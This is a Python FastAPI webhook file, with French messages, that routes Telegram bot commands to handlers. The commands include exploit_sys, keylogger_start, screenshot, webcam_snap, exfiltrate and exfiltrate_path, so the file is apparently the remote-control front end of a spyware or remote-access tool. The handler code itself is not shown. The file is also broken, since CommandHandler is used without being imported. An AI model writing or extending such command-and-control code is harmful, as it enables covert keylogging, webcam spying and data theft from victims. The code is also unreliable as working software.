# telegram/webhook.py

import os
from fastapi import APIRouter, Request, Header, HTTPException
from telegram import Update
from telegram.ext import ApplicationBuilder
from modules.utils import get_api_keys
from modules.telegram_bot import menu, osint, scan, exploit_sys, screenshot, keylogger_start, webcam_snap, exfiltrate, exfiltrate_path, rapport

api = get_api_keys()

TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

router = APIRouter()

@router.post("/telegram/webhook")
async def telegram_webhook(
    request: Request,
    x_telegram_bot_api_secret_token: str = Header(None)
):
    if SECRET_TOKEN and x_telegram_bot_api_secret_token != SECRET_TOKEN:
        raise HTTPException(status_code=403, detail="⛔ Jeton secret invalide.")

    try:
        data = await request.json()
        update = Update.de_json(data, ApplicationBuilder().token(TOKEN).build().bot)

        # Construction manuelle de l'application pour traiter la commande
        app = ApplicationBuilder().token(TOKEN).build()

        app.add_handler(CommandHandler("menu", menu))
        app.add_handler(CommandHandler("osint", osint))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
        app.add_handler(CommandHandler("screenshot", screenshot))
        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
        app.add_handler(CommandHandler("rapport", rapport))

        await app.process_update(update)
        return {"status": "ok"}

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erreur webhook: {e}")
